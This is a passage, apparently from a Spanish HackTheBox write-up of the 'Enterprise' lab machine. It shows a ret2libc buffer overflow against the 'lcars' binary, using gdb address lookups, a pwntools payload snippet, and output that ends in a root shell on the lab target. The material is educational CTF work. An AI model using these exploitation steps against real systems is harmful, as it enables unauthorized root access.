+  <p>“So our next 4 bytes will be either a valid return adress (perhaps another C library function ^^?), or some random garbage”, tomado de <a href="https://0x00sec.org/t/exploiting-techniques-000-ret2libc/1833">Exploiting Techniques - ret2libc</a>.</p>
+</blockquote>
+
+<p>Como bien dice ahí, los siguientes 4 bytes despues de la función <code>system()</code> podrían ser o basura o alguna otra función del programa, pero debe ir algo (:</p>
+
+<p>Listo, ejecutemos:</p>
+
+<pre><code class="language-bash">❭ python3 exploit.py ./lcars
+[*] '/htb/enterprise/scripts/lcars'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX disabled
+    PIE:      PIE enabled
+    RWX:      Has RWX segments
+[+] Starting local process './lcars': pid 1163091
+[*] Switching to interactive mode
+
+$ whoami
+root
+$ hostname -I
+10.10.14.17
+$  
+</code></pre>
+
+<p>Bieeeeeeeeeeeeeeeen, tenemos una <code>/bin/sh</code>, en este caso en nuestra máquina, pero ya podríamos indicarle el argumento <strong>REMOTE</strong>, para que tome la dirección IP y el puerto de la máquina víctima:</p>
+
+<pre><code class="language-bash">❭ python3 exploit.py ./lcars REMOTE
+[*] '/htb/enterprise/scripts/lcars'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX disabled
+    PIE:      PIE enabled
+    RWX:      Has RWX segments
+[+] Opening connection to 10.10.10.61 on port 32812: Done
+[*] Switching to interactive mode
+
+[*] Got EOF while reading in interactive
+$ id
+$ 
+[*] Closed connection to 10.10.10.61 port 32812
+[*] Got EOF while sending in interactive
+</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/enterprise/112sad_ok.gif" style="display: block; margin-left: auto; margin-right: auto; width: 60%;" /></p>
+
+<p>Jmmm, dando unas vueltas cai en cuenta que el programa está tomando <strong>nuestras</strong> direcciones en memoria, o sea con las que interactúa el programa en <strong>nuestro sistema</strong>, tiene sentido que no sirva, ya que esas <strong>direcciones</strong> probablemente no sean las mismas que usa el programa en la máquina víctima… Juguemos con ella (ya que tiene <strong>gdb</strong>) para extraer las direcciones en memoria y validar si ese es el error:</p>
+
+<pre><code class="language-bash">www-data@enterprise:/bin$ gdb ./lcars -q
+Reading symbols from ./lcars...(no debugging symbols found)...done.
+(gdb)
+</code></pre>
+
+<p>Para obtener todos los valores necesitamos que el programa se ejecute y tenga un <strong>breakpoint</strong> (este para obtener “/bin/sh”), asi que hacemos todo el recorrido (código &gt; 4 &gt; cadena en el apartado <em>seguridad</em>) y ahí si jugamos:</p>
+
+<pre><code class="language-bash">...
+(gdb) p system
+$1 = {&lt;text variable, no debug info&gt;} 0xf7e4c060 &lt;system&gt;
+(gdb) find 0xf7e4c060,+87654321,"/bin/sh"
+warning: Unable to access 16000 bytes of target memory at 0xf7f55a67, halting search.
+Pattern not found.
+(gdb) b main
+Breakpoint 1 at 0x56555ca0
+(gdb) r
+Starting program: /bin/lcars 
+
+Breakpoint 1, 0x56555ca0 in main ()
+(gdb) find 0xf7e4c060,+87654321,"/bin/sh"
+0xf7f70a0f
+warning: Unable to access 16000 bytes of target memory at 0xf7fca797, halting search.
+1 pattern found.
+(gdb) 
+</code></pre>
+
+<p>Bien, ya tenemos los 2 valores:</p>
+
+<ul>
+  <li><code>system()</code>: <code>0xf7e4c060</code>.</li>
+  <li><code>/bin/sh</code>: <code>0xf7f70a0f</code>.</li>
+</ul>
+
+<p>Agreguémoslos al script y ejecutemos :O</p>
+
+<pre><code class="language-py">...
+payload = ("A"*212).encode() # Pasamos la cadena a bytes para poder concatenarla
+payload += p32(0xf7e4c060, endian='little') # System
+payload += ("B"*4).encode() # + basurita
+payload += p32(0xf7f70a0f, endian='little') # /bin/sh
+...
+</code></pre>
+
+<pre><code class="language-bash">❭ python3 exploit.py ./lcars REMOTE
+[*] '/htb/enterprise/scripts/lcars'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX disabled
+    PIE:      PIE enabled
+    RWX:      Has RWX segments
+[+] Opening connection to 10.10.10.61 on port 32812: Done
+[*] Switching to interactive mode
+
+[*] Got EOF while reading in interactive
+$ id
+$ 
+[*] Closed connection to 10.10.10.61 port 32812
+[*] Got EOF while sending in interactive
+</code></pre>
+
+<p>Pero tampoco… Guiándome por algunos post, algunos simplemente buscaban la cadena “<code>sh</code>” (haciendo referencia a la <code>/bin/sh</code>), intentemos buscar esa cadena:</p>
+
+<pre><code class="language-bash">(gdb) find 0xf7e4c060,+87654321,"sh"
+0xf7f6ddd5
+0xf7f6e7e1
+0xf7f70a14
+0xf7f72582
+warning: Unable to access 16000 bytes of target memory at 0xf7fc8485, halting search.
+4 patterns found.
+</code></pre>
+
+<p>Hay 4 coincidencias en memoria, tomemos la primera y remplacémosla por la dirección <code>/bin/sh</code> que teníamos:</p>
+
+<pre><code class="language-bash">❭ python3 exploit.py ./lcars REMOTE
+[*] '/htb/enterprise/scripts/lcars'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX disabled
+    PIE:      PIE enabled
+    RWX:      Has RWX segments
+[+] Opening connection to 10.10.10.61 on port 32812: Done
+[*] Switching to interactive mode
+
+$ id
+uid=0(root) gid=0(root) groups=0(root)
+$ hostname -I
+10.10.10.61 172.17.0.1 dead:beef::250:56ff:feb9:7ba 
+$ hostname
+enterprise.htb
+$  
+</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/enterprise/112boom.gif" style="display: block; margin-left: auto; margin-right: auto; width: 90%;" /></p>
+
+<p>PERF3ct0000000000oooOOOOOOOOoooooooVoooo………….</p>
+
+<p>Tenemos una <code>sh</code> en la máquina víctima aprovechándonos de un buffer overflow con el ataque <strong>ret2libc</strong> (: que belleza eh!</p>
+
+<p><strong>(Probando con las 4 direcciones que encontramos relacionadas con <code>sh</code>, la única que da problemas es <code>0xf7f70a14</code>, de resto también obtenemos una Shell 😊)</strong></p>
+
+<blockquote>
+  <p><a href="https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/enterprise/exploitBOF.py">exploitBOF.py</a></p>
+</blockquote>
+
+<p>Solo nos quedaría ver las flags:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/enterprise/112flags.png" alt="112flags" /></p>
+
+<p>…</p>
+
+<p>Creamos un script para elegir en que sistema queremos ejecutar comandos remotamente, ya sea en el contenedor que tiene <strong>WordPress</strong>, el que tiene <strong>Joomla</strong> o contra el propio <strong>host</strong>:</p>
+
+<blockquote>
+  <p><a href="https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/enterprise/RCE_word_joom_host.py">RCE_word_joom_host.py</a></p>
+</blockquote>
+
+<p>…</p>
+
+<p>Ufff, que locura no? Me disculpo si escribí mucho, pero como digo siempre, prefiero hacerlo asi para que sea más didáctico y se puedan ver errores y explicaciones extras (que nunca vienen mal). Me gusto mucho la máquina en general, algo raro el tema del SQL (que me funciono con mi sentencia normal, pero despues se pudrió todo y toco concatenarle cositas), pero se aprende a jugar con sentencias. La parte del <strong>BOF</strong> estuvo brutal, es la primera máquina en la que tengo que jugar con algo asi, ya que en <a href="https://lanzt.github.io/blog/htb/HackTheBox-Buff">Buff</a> debíamos explotar un exploit conocido relacionado con <strong>Buffer overflow</strong>, pero no debíamos hacerlo tan manual, asi que estuvo increíble.</p>
+
+<p>Y bueno, como siempre y como nunca, a seguir rompiendo todo!! Bless</p>
+
+</div>
+
+<!-- Rating -->
+
+
+<!-- Author Box if enabled from _config.yml -->
+<!-- Author Box -->
+
+
+
+
+<!-- Comments if not disabled with comments: false -->
+<!-- Comments
+================================================== -->
+ 
+<div class="comments">
+    <button class="btn btn-dark show-comments">Comentarios</button>         
+    <div id="comments">  
+        <h4 class="mb-4">Comments</h4>                 
+            <section class="disqus">
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+        var disqus_shortname = 'demowebsite'; 
+        var disqus_developer = 0;
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = window.location.protocol + '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</section>
+     
+    <div class="clearfix"></div>              
+    </div>    
+</div>       
+
+
+<!-- Share -->
+<div class="share">
+    <p>
+        Vacios
+    </p>
+    <ul>
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://twitter.com/intent/tweet?text=HackTheBox - Enterprise&url=http://localhost:4000/htb/enterprise" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                <i class="fab fa-twitter"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://www.hackthebox.eu/profile/73707" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fas fa-cube"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://github.com/lanzt" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fab fa-github"></i>
+            </a>
+        </li>
+
+    </ul>
+</div>
+
+
+<!-- Related Post -->
+<!-- Related Posts
+================================================== -->
+<div class=" related-posts ">  
+
+    
+    <h2 class="text-center mb-4">Posts relacionados a este (o se hace el intento).</h2>
+    
+    
+    <div class="d-flex justify-content-center align-items-center">
+
+    <!-- Tags -->  
+    
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#SQLi">SQLi</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#buffer-overflow">buffer-overflow</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#docker">docker</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#joomla">joomla</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#pivoting">pivoting</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#wordpress">wordpress</a>               
+    
+    
+    <!-- Categories -->
+    
+    
+    <a class="smoothscroll badge badge-primary" href="/categories#htb">htb</a>                
+    
+
+    </div>
+
+    
+    
+    
+    <div class="blog-grid-container">
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/unobtainium">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338banner.png" alt="HackTheBox - Unobtainium"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/unobtainium">HackTheBox - Unobtainium</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina Linux nivel difícil. Explotaremos una app de Linux. Jugando con librerías de JavaScript, la infectaremos (Prototype Pollution en lodash) y haremos command-injection (en google-cloudstorage-commands). Y moveremos internamente muchas cosas...</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">30 Aug 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/proper">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/proper/321banner.png" alt="HackTheBox - Proper"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/proper">HackTheBox - Proper</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina Windows nivel difícil. Agregamos sal a nuestra inyección SQL, jugaremos a ganar la race condition y finalmente entre reversing, movimiento lateral, creación de scripts en PowerShell y pipes conseguiremos...</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">21 Aug 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/curling">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160banner.png" alt="HackTheBox - Curling"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/curling">HackTheBox - Curling</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina Linux nivel fácil. Ojos bien abiertos en la página web, jueguitos con templates de Joomla, loops de backups (?), movimientos sensuales con un archivo de configuración de cURL y...</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">21 Aug 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+                
+        </div>        
+</div>
+
+<!-- Review with LD-JSON, adapt it for your needs if you like, but make sure you test the generated HTML source code first: 
+https://search.google.com/structured-data/testing-tool/u/0/
+================================================== -->
+
+    </div>
+
+    
+    <!-- Newsletter
+    ================================================== -->
+    <div class="newsletter text-center">
+        <span class="h4"><img src="/assets/images/sh0x.png" class="newsletter-logo" alt="Sh0x blog"></span>
+        <p></p>
+    </div>
+    
+    
+</div>
+
+<!-- Begin Footer
+================================================== -->
+<footer class="footer">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-6 col-sm-12 text-center text-lg-left">
+                Copyright © 2022 Sh0x blog 
+            </div>
+            <div class="col-md-6 col-sm-12 text-center text-lg-right">    
+                <a target="_blank" href="https://www.wowthemes.net/memoirs-free-jekyll-theme/">Memoirs Jekyll Theme</a> by WowThemes.net
+            </div>
+        </div>
+    </div>
+</footer>
+<!-- End Footer
+================================================== -->
+
+</div> <!-- /.site-content -->
+
+<!-- Scripts (if you need bootstrap.js, please add it yourself. I didn't use it for performance reasons, it was not needed in this theme)
+================================================== -->
+
+<script src="/assets/js/prism.js"></script>
+
+<script src="/assets/js/theme.js"></script>
+
+
+
+
+<script id="dsq-count-scr" src="//demowebsite.disqus.com/count.js"></script>
+
+
+</body>
+</html>
